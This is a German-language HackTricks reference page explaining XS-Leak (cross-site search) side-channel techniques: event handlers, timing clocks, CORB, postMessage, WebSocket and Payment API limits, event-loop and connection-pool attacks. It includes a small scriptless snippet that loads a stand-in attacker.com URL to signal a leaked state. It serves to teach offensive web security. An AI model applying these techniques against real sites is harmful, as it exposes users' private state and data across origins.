# XS-Search/XS-Leaks

<figure><img src="../.gitbook/assets/image (3) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Verwenden Sie [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks), um Workflows einfach zu erstellen und zu automatisieren, die von den fortschrittlichsten Community-Tools der Welt unterst√ºtzt werden.\
Erhalten Sie noch heute Zugriff:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

<details>

<summary><strong>Lernen Sie das Hacken von AWS von Grund auf mit</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Andere M√∂glichkeiten, HackTricks zu unterst√ºtzen:

* Wenn Sie Ihr **Unternehmen in HackTricks bewerben m√∂chten** oder **HackTricks als PDF herunterladen m√∂chten**, √ºberpr√ºfen Sie die [**ABONNEMENTPL√ÑNE**](https://github.com/sponsors/carlospolop)!
* Holen Sie sich das [**offizielle PEASS & HackTricks-Merchandise**](https://peass.creator-spring.com)
* Entdecken Sie [**The PEASS Family**](https://opensea.io/collection/the-peass-family), unsere Sammlung exklusiver [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Treten Sie der** üí¨ [**Discord-Gruppe**](https://discord.gg/hRep4RUj7f) oder der [**Telegramm-Gruppe**](https://t.me/peass) bei oder **folgen** Sie uns auf **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Teilen Sie Ihre Hacking-Tricks, indem Sie PRs an die** [**HackTricks**](https://github.com/carlospolop/hacktricks) und [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) GitHub-Repositories senden.

</details>

## Grundlegende Informationen

XS-Search ist eine Methode zur **Extraktion von Cross-Origin-Informationen**, indem **Side-Channel-Schwachstellen** ausgenutzt werden.

Zu den Schl√ºsselkomponenten dieses Angriffs geh√∂ren:

* **Verwundbare Website**: Die Zielwebsite, von der Informationen extrahiert werden sollen.
* **Angreifer-Website**: Die b√∂sartige Website, die vom Angreifer erstellt wird und die das Opfer besucht und den Exploit hostet.
* **Inklusionsmethode**: Die verwendete Technik, um die verwundbare Website in die Angreifer-Website einzubinden (z. B. window.open, iframe, fetch, HTML-Tag mit href usw.).
* **Leak-Technik**: Techniken, die verwendet werden, um Unterschiede im Zustand der verwundbaren Website anhand der durch die Inklusionsmethode gesammelten Informationen zu erkennen.
* **Zust√§nde**: Die beiden potenziellen Zust√§nde der verwundbaren Website, die der Angreifer unterscheiden m√∂chte.
* **Erkennbare Unterschiede**: Beobachtbare Variationen, auf die der Angreifer angewiesen ist, um den Zustand der verwundbaren Website zu erschlie√üen.

### Erkennbare Unterschiede

Es k√∂nnen mehrere Aspekte analysiert werden, um die Zust√§nde der verwundbaren Website zu unterscheiden:

* **Statuscode**: Unterscheidung zwischen **verschiedenen HTTP-Antwortstatuscodes** √ºber Cross-Origin hinweg, wie Serverfehler, Clientfehler oder Authentifizierungsfehler.
* **API-Nutzung**: Identifizierung der **Nutzung von Web-APIs** auf verschiedenen Seiten, um festzustellen, ob eine Cross-Origin-Seite eine bestimmte JavaScript-Web-API verwendet.
* **Weiterleitungen**: Erkennen von Navigationen zu verschiedenen Seiten, nicht nur HTTP-Weiterleitungen, sondern auch solche, die durch JavaScript oder HTML ausgel√∂st werden.
* **Seiteninhalt**: Beobachtung von **Variationen im HTTP-Antwortk√∂rper** oder in Unterressourcen der Seite, wie der **Anzahl eingebetteter Frames** oder Gr√∂√üenunterschieden bei Bildern.
* **HTTP-Header**: Feststellen der Anwesenheit oder m√∂glicherweise des Werts eines **spezifischen HTTP-Antwortheaders**, einschlie√ülich Header wie X-Frame-Options, Content-Disposition und Cross-Origin-Resource-Policy.
* **Timing**: Feststellen von konsistenten Zeitunterschieden zwischen den beiden Zust√§nden.

### Inklusionsmethoden

* **HTML-Elemente**: HTML bietet verschiedene Elemente zur **Einbindung von Cross-Origin-Ressourcen**, wie Stylesheets, Bilder oder Skripte, die den Browser dazu zwingen, eine nicht-HTML-Ressource anzufordern. Eine Zusammenstellung potenzieller HTML-Elemente f√ºr diesen Zweck finden Sie unter [https://github.com/cure53/HTTPLeaks](https://github.com/cure53/HTTPLeaks).
* **Frames**: Elemente wie **iframe**, **object** und **embed** k√∂nnen HTML-Ressourcen direkt in die Seite des Angreifers einbetten. Wenn die Seite **keinen Framing-Schutz** aufweist, kann JavaScript √ºber die Eigenschaft contentWindow auf das Fensterobjekt der eingebetteten Ressource zugreifen.
* **Pop-ups**: Die Methode **`window.open`** √∂ffnet eine Ressource in einem neuen Tab oder Fenster und bietet einen **Fenstergriff**, mit dem JavaScript auf Methoden und Eigenschaften gem√§√ü der SOP zugreifen kann. Pop-ups, die h√§ufig bei Single Sign-On verwendet werden, umgehen die Framing- und Cookie-Beschr√§nkungen einer Zielressource. Moderne Browser beschr√§nken jedoch die Erstellung von Pop-ups auf bestimmte Benutzeraktionen.
* **JavaScript-Anfragen**: JavaScript erm√∂glicht direkte Anfragen an Zielressourcen mit Hilfe von **XMLHttpRequests** oder der **Fetch API**. Diese Methoden bieten eine pr√§zise Kontrolle √ºber die Anfrage, z. B. die M√∂glichkeit, HTTP-Weiterleitungen zu verfolgen.

### Leak-Techniken

* **Event-Handler**: Eine klassische Leak-Technik in XS-Leaks, bei der Event-Handler wie **onload** und **onerror** Informationen √ºber den Erfolg oder Misserfolg des Ressourcenladens liefern.
* **Fehlermeldungen**: JavaScript-Ausnahmen oder spezielle Fehlerseiten k√∂nnen Informationen √ºber Lecks liefern, entweder direkt aus der Fehlermeldung oder durch Unterscheidung zwischen deren Vorhandensein und Abwesenheit.
* **Globale Grenzen**: Physische Beschr√§nkungen eines Browsers, wie Speicherkapazit√§t oder andere durchgesetzte Browsereinschr√§nkungen, k√∂nnen signalisieren, wenn eine Schwelle erreicht ist und als Leck-Technik dienen.
* **Globale Zust√§nde**: Erkennbare Interaktionen mit den **globalen Zust√§nden** von Browsern (z. B. die History-Schnittstelle) k√∂nnen ausgenutzt werden. Zum Beispiel kann die **Anzahl der Eintr√§ge** in der Browser-History Hinweise auf Cross-Origin-Seiten liefern.
* **Performance-API**: Diese API liefert **Leistungsdaten der aktuellen Seite**, einschlie√ülich Netzwerk-Timing f√ºr das Dokument und geladene Ressourcen, was R√ºckschl√ºsse auf angeforderte Ressourcen erm√∂glicht.
* **Lesbare Attribute**: Einige HTML-Attribute sind **lesbar √ºber Cross-Origin** und k√∂nnen als Leck-Technik verwendet werden. Zum Beispiel erm√∂glicht die Eigenschaft `window.frame.length` in JavaScript das Z√§hlen der in einer Cross-Origin-Webseite enthaltenen Frames.

## XSinator-Tool & Paper

XSinator ist ein automatisches Tool, um **Browser gegen mehrere bekannte XS-Leaks** zu √ºberpr√ºfen, wie in seinem Paper erkl√§rt: **[https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf)**

Sie k√∂nnen **auf das Tool unter [https://xsinator.com/](https://xsinator.com/) zugreifen**

{% hint style="warning" %}
**Ausgeschlossene XS-Leaks**: Wir mussten XS-Leaks ausschlie√üen, die auf **Service Workern** beruhen, da sie sich mit anderen Lecks in XSinator √ºberschneiden w√ºrden. Dar√ºber hinaus haben wir uns daf√ºr entschieden, XS-Leaks auszuschlie√üen, die auf Fehlkonfigurationen und Fehlern in einer bestimmten Webanwendung beruhen. Zum Beispiel Cross-Origin Resource Sharing (CORS) Fehlkonfigurationen, postMessage-Lecks oder Cross-Site Scripting. Dar√ºber hinaus haben wir zeitbasierte XS-Leaks ausgeschlossen, da sie oft langsam, ungenau und fehleranf√§llig sind.
{% endhint %}

<figure><img src="../.gitbook/assets/image (3) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

\
Verwenden Sie [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks), um Workflows einfach zu erstellen und zu automatisieren, die von den fortschrittlichsten Community-Tools der Welt unterst√ºtzt werden.\
Erhalten Sie noch heute Zugriff:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}
## **Timing-basierte Techniken**

Einige der folgenden Techniken verwenden Timing als Teil des Prozesses, um Unterschiede in den m√∂glichen Zust√§nden der Webseiten zu erkennen. Es gibt verschiedene M√∂glichkeiten, die Zeit in einem Webbrowser zu messen.

**Uhren**: Die [performance.now()](https://developer.mozilla.org/en-US/docs/Web/API/Performance/now)-API erm√∂glicht Entwicklern hochaufl√∂sende Zeitmessungen.\
Es gibt eine betr√§chtliche Anzahl von APIs, die Angreifer missbrauchen k√∂nnen, um implizite Uhren zu erstellen: [Broadcast Channel API](https://developer.mozilla.org/en-US/docs/Web/API/Broadcast_Channel_API), [Message Channel API](https://developer.mozilla.org/en-US/docs/Web/API/MessageChannel), [requestAnimationFrame](https://developer.mozilla.org/en-US/docs/Web/API/window/requestAnimationFrame), [setTimeout](https://developer.mozilla.org/en-US/docs/Web/API/WindowOrWorkerGlobalScope/setTimeout), CSS-Animationen und andere.\
Weitere Informationen: [https://xsleaks.dev/docs/attacks/timing-attacks/clocks](https://xsleaks.dev/docs/attacks/timing-attacks/clocks/).

## Techniken f√ºr Ereignishandler

### Onload/Onerror

* **Einbindungsmethoden**: Frames, HTML-Elemente
* **Erkennbarer Unterschied**: Statuscode
* **Weitere Informationen**: [https://www.usenix.org/conference/usenixsecurity19/presentation/staicu](https://www.usenix.org/conference/usenixsecurity19/presentation/staicu), [https://xsleaks.dev/docs/attacks/error-events/](https://xsleaks.dev/docs/attacks/error-events/)
* **Zusammenfassung**: Wenn versucht wird, eine Ressource zu laden und die onerror/onload-Ereignisse ausgel√∂st werden, wenn die Ressource erfolgreich/nicht erfolgreich geladen wird, ist es m√∂glich, den Statuscode herauszufinden.
* **Codebeispiel**: [https://xsinator.com/testing.html#Event%20Handler%20Leak%20(Script)](https://xsinator.com/testing.html#Event%20Handler%20Leak%20\(Script\))

{% content-ref url="xs-search/cookie-bomb-+-onerror-xs-leak.md" %}
[cookie-bomb-+-onerror-xs-leak.md](xs-search/cookie-bomb-+-onerror-xs-leak.md)
{% endcontent-ref %}

Das Codebeispiel versucht, **Skriptobjekte aus JS zu laden**, aber auch **andere Tags** wie Objekte, Stylesheets, Bilder, Audios k√∂nnten verwendet werden. Au√üerdem ist es auch m√∂glich, das **Tag direkt einzuf√ºgen** und die `onload`- und `onerror`-Ereignisse im Tag selbst zu deklarieren (anstatt es von JS aus einzuf√ºgen).

Es gibt auch eine scriptlose Version dieses Angriffs:
```html
<object data="//example.com/404">
<object data="//attacker.com/?error"></object>
</object>
```
In diesem Fall wird, wenn `example.com/404` nicht gefunden wird, `attacker.com/?error` geladen.

### Onload Timing

* **Inklusionsmethoden**: HTML-Elemente
* **Erkennbarer Unterschied**: Timing (in der Regel aufgrund des Seiteninhalts, des Statuscodes)
* **Weitere Informationen**: [https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#onload-events](https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#onload-events)
* **Zusammenfassung**: Die [**performance.now()**](https://xsleaks.dev/docs/attacks/timing-attacks/clocks/#performancenow) **API** kann verwendet werden, um die Zeit zu messen, die f√ºr eine Anfrage ben√∂tigt wird. Es k√∂nnten jedoch auch andere Uhren verwendet werden, wie z.B. die [**PerformanceLongTaskTiming API**](https://developer.mozilla.org/en-US/docs/Web/API/PerformanceLongTaskTiming), die Aufgaben identifizieren kann, die l√§nger als 50 ms laufen.
* **Codebeispiel**: [https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#onload-events](https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#onload-events) ein weiteres Beispiel in:

{% content-ref url="xs-search/performance.now-example.md" %}
[performance.now-example.md](xs-search/performance.now-example.md)
{% endcontent-ref %}

#### Onload Timing + Erzwungene schwere Aufgabe

Diese Technik ist √§hnlich wie die vorherige, aber der **Angreifer** wird auch eine **relevante Menge an Zeit** erzwingen, wenn die **Antwort positiv oder negativ** ist, und diese Zeit messen.

{% content-ref url="xs-search/performance.now-+-force-heavy-task.md" %}
[performance.now-+-force-heavy-task.md](xs-search/performance.now-+-force-heavy-task.md)
{% endcontent-ref %}

### unload/beforeunload Timing

* **Inklusionsmethoden**: Frames
* **Erkennbarer Unterschied**: Timing (in der Regel aufgrund des Seiteninhalts, des Statuscodes)
* **Weitere Informationen**: [https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#unload-events](https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#unload-events)
* **Zusammenfassung**: Die [SharedArrayBuffer-Uhr](https://xsleaks.dev/docs/attacks/timing-attacks/clocks/#sharedarraybuffer-and-web-workers) kann verwendet werden, um die Zeit zu messen, die f√ºr eine Anfrage ben√∂tigt wird. Es k√∂nnten auch andere Uhren verwendet werden.
* **Codebeispiel**: [https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#unload-events](https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#unload-events)

Die Zeit, die ben√∂tigt wird, um eine Ressource abzurufen, kann gemessen werden, indem die Ereignisse [`unload`](https://developer.mozilla.org/en-US/docs/Web/API/Window/unload_event) und [`beforeunload`](https://developer.mozilla.org/en-US/docs/Web/API/Window/beforeunload_event) genutzt werden. Das Ereignis **`beforeunload`** wird ausgel√∂st, wenn der Browser kurz davor steht, zu einer neuen Seite zu navigieren, w√§hrend das Ereignis **`unload`** auftritt, wenn die Navigation tats√§chlich stattfindet. Der Zeitunterschied zwischen diesen beiden Ereignissen kann berechnet werden, um die **Dauer zu bestimmen, die der Browser f√ºr das Abrufen der Ressource ben√∂tigt hat**.

### Sandboxed Frame Timing + onload <a href="#sandboxed-frame-timing-attacks" id="sandboxed-frame-timing-attacks"></a>

* **Inklusionsmethoden**: Frames
* **Erkennbarer Unterschied**: Timing (in der Regel aufgrund des Seiteninhalts, des Statuscodes)
* **Weitere Informationen**: [https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#sandboxed-frame-timing-attacks](https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#sandboxed-frame-timing-attacks)
* **Zusammenfassung**: Die [performance.now()](https://xsleaks.dev/docs/attacks/timing-attacks/clocks/#performancenow) API kann verwendet werden, um die Zeit zu messen, die f√ºr eine Anfrage ben√∂tigt wird. Es k√∂nnten auch andere Uhren verwendet werden.
* **Codebeispiel**: [https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#sandboxed-frame-timing-attacks](https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#sandboxed-frame-timing-attacks)

Es wurde beobachtet, dass in Abwesenheit von [Framing-Schutzma√ünahmen](https://xsleaks.dev/docs/defenses/opt-in/xfo/) die Zeit, die f√ºr das Laden einer Seite und ihrer Unterressourcen √ºber das Netzwerk ben√∂tigt wird, von einem Angreifer gemessen werden kann. Diese Messung ist in der Regel m√∂glich, weil der `onload`-Handler eines Iframes erst nach dem Abschluss des Ressourcenladens und der JavaScript-Ausf√ºhrung ausgel√∂st wird. Um die durch die Skriptausf√ºhrung eingef√ºhrte Variabilit√§t zu umgehen, k√∂nnte ein Angreifer das [`sandbox`](https://developer.mozilla.org/en-US/docs/Web/HTML/Element/iframe)-Attribut innerhalb des `<iframe>` verwenden. Durch die Verwendung dieses Attributs werden zahlreiche Funktionen eingeschr√§nkt, insbesondere die Ausf√ºhrung von JavaScript, was eine Messung erm√∂glicht, die haupts√§chlich von der Netzwerkperformance beeinflusst wird.
```javascript
// Example of an iframe with the sandbox attribute
<iframe src="example.html" sandbox></iframe>
```
### #ID + Fehler + onload

* **Einschlussmethoden**: Frames
* **Unterscheidbarer Unterschied**: Seitenelemente
* **Weitere Informationen**:
* **Zusammenfassung**: Wenn Sie die Seite dazu bringen k√∂nnen, einen Fehler anzuzeigen, wenn der richtige Inhalt abgerufen wird, und sie korrekt l√§dt, wenn beliebiger Inhalt abgerufen wird, k√∂nnen Sie eine Schleife erstellen, um alle Informationen ohne Zeitmessung zu extrahieren.
* **Codebeispiel**:

Angenommen, Sie k√∂nnen die Seite, die den geheimen Inhalt enth√§lt, in ein Iframe einf√ºgen.

Sie k√∂nnen das Opfer dazu bringen, nach der Datei zu suchen, die "_**flag**_" enth√§lt, indem Sie ein Iframe verwenden (zum Beispiel durch Ausnutzung eines CSRF). Im Iframe wissen Sie, dass das _**onload-Ereignis**_ mindestens einmal immer ausgef√ºhrt wird. Dann k√∂nnen Sie die **URL** des Iframes √§ndern, indem Sie nur den **Inhalt** des **Hashes** in der URL √§ndern.

Beispiel:

1. **URL1**: www.attacker.com/xssearch#try1
2. **URL2**: www.attacker.com/xssearch#try2

Wenn die erste URL **erfolgreich geladen** wurde, wird das **onload**-Ereignis beim **√Ñndern** des **Hash**-Teils der URL **nicht erneut ausgel√∂st**. Aber **wenn** die Seite beim **Laden** einen **Fehler** hatte, wird das **onload**-Ereignis **erneut ausgel√∂st**.

Dann k√∂nnen Sie zwischen einer **korrekt** geladenen Seite und einer Seite unterscheiden, die einen **Fehler** aufweist, wenn sie aufgerufen wird.

### Ausf√ºhrung von Javascript

* **Einschlussmethoden**: Frames
* **Unterscheidbarer Unterschied**: Seitenelemente
* **Weitere Informationen**:
* **Zusammenfassung**: Wenn die **Seite** den **sensiblen** Inhalt **zur√ºckgibt** oder einen **Inhalt**, der vom Benutzer **kontrolliert** werden kann. Der Benutzer kann im negativen Fall **g√ºltigen JS-Code festlegen**, und bei jedem Versuch wird er in **`<script>`**-Tags geladen, sodass im negativen Fall der **Code** der Angreifer **ausgef√ºhrt** wird und im positiven Fall **nichts** ausgef√ºhrt wird.
* **Codebeispiel**:

{% content-ref url="xs-search/javascript-execution-xs-leak.md" %}
[javascript-execution-xs-leak.md](xs-search/javascript-execution-xs-leak.md)
{% endcontent-ref %}

### CORB - Onerror

* **Einschlussmethoden**: HTML-Elemente
* **Unterscheidbarer Unterschied**: Statuscode & Header
* **Weitere Informationen**: [https://xsleaks.dev/docs/attacks/browser-features/corb/](https://xsleaks.dev/docs/attacks/browser-features/corb/)
* **Zusammenfassung**: **Cross-Origin Read Blocking (CORB)** ist eine Sicherheitsma√ünahme, die verhindert, dass Webseiten bestimmte sensible Ressourcen aus anderen Urspr√ºngen laden, um sich vor Angriffen wie **Spectre** zu sch√ºtzen. Angreifer k√∂nnen jedoch das sch√ºtzende Verhalten ausnutzen. Wenn eine Antwort, die **CORB** unterliegt, einen mit `nosniff` gesch√ºtzten `Content-Type` und einen `2xx`-Statuscode zur√ºckgibt, entfernt **CORB** den Inhalt und die Header der Antwort. Angreifer k√∂nnen daraus die Kombination aus dem **Statuscode** (der den Erfolg oder Fehler anzeigt) und dem `Content-Type` (der angibt, ob er von **CORB** gesch√ºtzt ist) ableiten und so potenzielle Informationen preisgeben.
* **Codebeispiel**:

Weitere Informationen finden Sie unter dem Link zur weiteren Information √ºber den Angriff.

### onblur

* **Einschlussmethoden**: Frames
* **Unterscheidbarer Unterschied**: Seitenelemente
* **Weitere Informationen**: [https://xsleaks.dev/docs/attacks/id-attribute/](https://xsleaks.dev/docs/attacks/id-attribute/), [https://xsleaks.dev/docs/attacks/experiments/portals/](https://xsleaks.dev/docs/attacks/experiments/portals/)
* **Zusammenfassung**: Lecken sensibler Daten aus dem ID- oder Name-Attribut.
* **Codebeispiel**: [https://xsleaks.dev/docs/attacks/id-attribute/#code-snippet](https://xsleaks.dev/docs/attacks/id-attribute/#code-snippet)

Es ist m√∂glich, eine Seite in ein Iframe zu laden und das **`#id_value`** zu verwenden, um die Seite auf das Element des Iframes zu fokussieren, das die angegebene ID hat. Wenn dann ein **`onblur`**-Signal ausgel√∂st wird, existiert das ID-Element.\
Sie k√∂nnen denselben Angriff mit **`portal`**-Tags durchf√ºhren.

### postMessage-Broadcasts <a href="#postmessage-broadcasts" id="postmessage-broadcasts"></a>

* **Einschlussmethoden**: Frames, Pop-ups
* **Unterscheidbarer Unterschied**: API-Nutzung
* **Weitere Informationen**: [https://xsleaks.dev/docs/attacks/postmessage-broadcasts/](https://xsleaks.dev/docs/attacks/postmessage-broadcasts/)
* **Zusammenfassung**: Erfassen sensibler Informationen aus einer postMessage oder Verwendung von postMessages als Orakel, um den Status des Benutzers auf der Seite zu kennen
* **Codebeispiel**: `Beliebiger Code, der auf alle postMessages h√∂rt.`

Anwendungen nutzen h√§ufig [`postMessage`-Broadcasts](https://developer.mozilla.org/en-US/docs/Web/API/Window/postMessage), um √ºber verschiedene Urspr√ºnge hinweg zu kommunizieren. Dieser Ansatz kann jedoch versehentlich **sensible Informationen** preisgeben, wenn der Parameter `targetOrigin` nicht ordnungsgem√§√ü angegeben ist und somit jedes Fenster die Nachrichten empfangen kann. Dar√ºber hinaus kann allein das Empfangen einer Nachricht als **Orakel** dienen. Beispielsweise werden bestimmte Nachrichten m√∂glicherweise nur an angemeldete Benutzer gesendet. Daher kann die Anwesenheit oder Abwesenheit dieser Nachrichten Informationen √ºber den Zustand oder die Identit√§t des Benutzers preisgeben, z. B. ob er authentifiziert ist oder nicht.

<figure><img src="../.gitbook/assets/image (3) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>





Verwenden Sie [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks), um Workflows einfach zu erstellen und zu automatisieren, die von den fortschrittlichsten Community-Tools der Welt unterst√ºtzt werden.\
Erhalten Sie noch heute Zugriff:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}



## Globale Grenztechniken

### WebSocket-API

* **Einschlussmethoden**: Frames, Pop-ups
* **Unterscheidbarer Unterschied**: API-Nutzung
* **Weitere Informationen**: [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf) (5.1)
* **Zusammenfassung**: Durch Ersch√∂pfung der WebSocket-Verbindungsgrenze wird die Anzahl der WebSocket-Verbindungen einer Cross-Origin-Seite preisgegeben.
* **Codebeispiel**: [https://xsinator.com/testing.html#WebSocket%20Leak%20(FF)](https://xsinator.com/testing.html#WebSocket%20Leak%20\(FF\)), [https://xsinator.com/testing.html#WebSocket%20Leak%20(GC)](https://xsinator.com/testing.html#WebSocket%20Leak%20\(GC\))

Es ist m√∂glich festzustellen, ob und wie viele **WebSocket-Verbindungen eine Zielseite verwendet**. Dies erm√∂glicht es einem Angreifer, Anwendungszust√§nde zu erkennen und Informationen preiszugeben, die mit der Anzahl der WebSocket-Verbindungen zusammenh√§ngen.

Wenn eine **Herkunft** die **maximale Anzahl von WebSocket-Verbindungsobjekten** verwendet, unabh√§ngig von ihrem Verbindungsstatus, f√ºhrt die Erstellung neuer Objekte zu JavaScript-Ausnahmen. Um diesen Angriff auszuf√ºhren, √∂ffnet die Angreifer-Website die Ziel-Website in einem Pop-up oder Iframe und versucht dann, nachdem die Ziel-Website geladen wurde, die maximale Anzahl von m√∂glichen WebSocket-Verbindungen zu erstellen. Die **Anzahl der geworfenen Ausnahmen** entspricht der **Anzahl der von der Ziel-Website verwendeten WebSocket-Verbindungen**.
### Zahlungs-API

* **Einschlussmethoden**: Frames, Pop-ups
* **Unterscheidbare Unterschiede**: API-Nutzung
* **Weitere Informationen**: [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf) (5.1)
* **Zusammenfassung**: Erkennen von Zahlungsanfragen, da nur eine gleichzeitig aktiv sein kann.
* **Codebeispiel**: [https://xsinator.com/testing.html#Payment%20API%20Leak](https://xsinator.com/testing.html#Payment%20API%20Leak)

Diese XS-Leak erm√∂glicht es einem Angreifer, **festzustellen, wann eine Cross-Origin-Seite eine Zahlungsanfrage initiiert**.

Da **nur eine Zahlungsanfrage gleichzeitig aktiv sein kann**, schlagen weitere Versuche, diese API zu verwenden, fehl und f√ºhren zu einer **JavaScript-Ausnahme**. Der Angreifer kann dies ausnutzen, indem er **periodisch versucht, die Payment-API-Benutzeroberfl√§che anzuzeigen**. Wenn ein Versuch eine Ausnahme verursacht, verwendet die Zielwebsite sie derzeit. Der Angreifer kann diese periodischen Versuche verbergen, indem er die Benutzeroberfl√§che unmittelbar nach der Erstellung schlie√üt.

### Timing des Event Loops <a href="#timing-the-event-loop" id="timing-the-event-loop"></a>

* **Einschlussmethoden**:
* **Unterscheidbare Unterschiede**: Timing (in der Regel aufgrund des Seiteninhalts, des Statuscodes)
* **Weitere Informationen**: [https://xsleaks.dev/docs/attacks/timing-attacks/execution-timing/#timing-the-event-loop](https://xsleaks.dev/docs/attacks/timing-attacks/execution-timing/#timing-the-event-loop)
* **Zusammenfassung**: Messung der Ausf√ºhrungszeit einer Webseite unter Ausnutzung des single-threaded JS Event Loops.
* **Codebeispiel**:

{% content-ref url="xs-search/event-loop-blocking-+-lazy-images.md" %}
[event-loop-blocking-+-lazy-images.md](xs-search/event-loop-blocking-+-lazy-images.md)
{% endcontent-ref %}

JavaScript arbeitet nach einem **single-threaded Event-Loop-Konkurrenzmodell**, was bedeutet, dass **nur eine Aufgabe gleichzeitig ausgef√ºhrt werden kann**. Diese Eigenschaft kann ausgenutzt werden, um **die Ausf√ºhrungszeit von Code aus einer anderen Quelle zu messen**. Ein Angreifer kann die Ausf√ºhrungszeit seines eigenen Codes im Event Loop messen, indem er kontinuierlich Ereignisse mit festen Eigenschaften versendet. Diese Ereignisse werden verarbeitet, wenn der Ereignispool leer ist. Wenn auch andere Quellen Ereignisse an denselben Pool senden, kann ein **Angreifer die Zeit ableiten, die f√ºr die Ausf√ºhrung dieser externen Ereignisse ben√∂tigt wird, indem er Verz√∂gerungen bei der Ausf√ºhrung seiner eigenen Aufgaben beobachtet**. Diese Methode zur √úberwachung des Event Loops auf Verz√∂gerungen kann die Ausf√ºhrungszeit von Code aus verschiedenen Quellen aufdecken und potenziell sensible Informationen offenlegen.

{% hint style="warning" %}
Bei einer Ausf√ºhrungszeitmessung ist es m√∂glich, **Netzwerkfaktoren zu eliminieren**, um **genauere Messungen** zu erhalten. Zum Beispiel, indem die von der Seite verwendeten Ressourcen vor dem Laden geladen werden.
{% endhint %}

### Besch√§ftigter Event Loop <a href="#busy-event-loop" id="busy-event-loop"></a>

* **Einschlussmethoden**:
* **Unterscheidbare Unterschiede**: Timing (in der Regel aufgrund des Seiteninhalts, des Statuscodes)
* **Weitere Informationen**: [https://xsleaks.dev/docs/attacks/timing-attacks/execution-timing/#busy-event-loop](https://xsleaks.dev/docs/attacks/timing-attacks/execution-timing/#busy-event-loop)
* **Zusammenfassung**: Eine Methode zur Messung der Ausf√ºhrungszeit einer Webseite besteht darin, absichtlich den Event Loop eines Threads zu blockieren und dann zu messen, **wie lange es dauert, bis der Event Loop wieder verf√ºgbar ist**. Durch das Einf√ºgen einer blockierenden Operation (wie einer langen Berechnung oder einem synchronen API-Aufruf) in den Event Loop und die √úberwachung der Zeit, die f√ºr die Ausf√ºhrung des nachfolgenden Codes ben√∂tigt wird, kann man auf die Dauer der Aufgaben schlie√üen, die w√§hrend des Blockierungszeitraums im Event Loop ausgef√ºhrt wurden. Diese Technik nutzt die single-threaded Natur des JavaScript Event Loops aus, bei dem Aufgaben sequenziell ausgef√ºhrt werden, und kann Einblicke in die Leistung oder das Verhalten anderer Operationen bieten, die denselben Thread teilen.
* **Codebeispiel**:

Ein wesentlicher Vorteil der Technik zur Messung der Ausf√ºhrungszeit durch das Blockieren des Event Loops besteht in der M√∂glichkeit, **Site Isolation** zu umgehen. **Site Isolation** ist eine Sicherheitsfunktion, die verschiedene Websites in separate Prozesse aufteilt, um zu verhindern, dass b√∂sartige Websites direkt auf sensible Daten anderer Websites zugreifen k√∂nnen. Durch die Beeinflussung der Ausf√ºhrungszeit einer anderen Quelle √ºber den gemeinsam genutzten Event Loop kann ein Angreifer indirekt Informationen √ºber die Aktivit√§ten dieser Quelle extrahieren. Diese Methode basiert nicht auf dem direkten Zugriff auf die Daten der anderen Quelle, sondern beobachtet vielmehr die Auswirkungen der Aktivit√§ten dieser Quelle auf den gemeinsam genutzten Event Loop und umgeht so die von **Site Isolation** geschaffenen Schutzbarrieren.

{% hint style="warning" %}
Bei einer Ausf√ºhrungszeitmessung ist es m√∂glich, **Netzwerkfaktoren zu eliminieren**, um **genauere Messungen** zu erhalten. Zum Beispiel, indem die von der Seite verwendeten Ressourcen vor dem Laden geladen werden.
{% endhint %}

### Verbindungs-Pool

* **Einschlussmethoden**: JavaScript-Anfragen
* **Unterscheidbare Unterschiede**: Timing (in der Regel aufgrund des Seiteninhalts, des Statuscodes)
* **Weitere Informationen**: [https://xsleaks.dev/docs/attacks/timing-attacks/connection-pool/](https://xsleaks.dev/docs/attacks/timing-attacks/connection-pool/)
* **Zusammenfassung**: Ein Angreifer k√∂nnte alle Sockets au√üer einem blockieren, die Zielwebseite laden und gleichzeitig eine andere Seite laden. Die Zeit, bis die letzte Seite zu laden beginnt, ist die Zeit, die die Zielwebseite zum Laden ben√∂tigt.
* **Codebeispiel**:

{% content-ref url="xs-search/connection-pool-example.md" %}
[connection-pool-example.md](xs-search/connection-pool-example.md)
{% endcontent-ref %}

Browser verwenden Sockets f√ºr die Kommunikation mit dem Server, aber aufgrund der begrenzten Ressourcen des Betriebssystems und der Hardware **m√ºssen Browser eine Begrenzung** f√ºr die Anzahl der gleichzeitigen Sockets festlegen. Angreifer k√∂nnen diese Begrenzung ausnutzen, indem sie die folgenden Schritte ausf√ºhren:

1. Ermitteln Sie die Socket-Begrenzung des Browsers, z. B. 256 globale Sockets.
2. Belegen Sie 255 Sockets f√ºr eine l√§ngere Zeit, indem Sie 255 Anfragen an verschiedene Hosts initiieren, die darauf abzielen, die Verbindungen offen zu halten, ohne sie abzuschlie√üen.
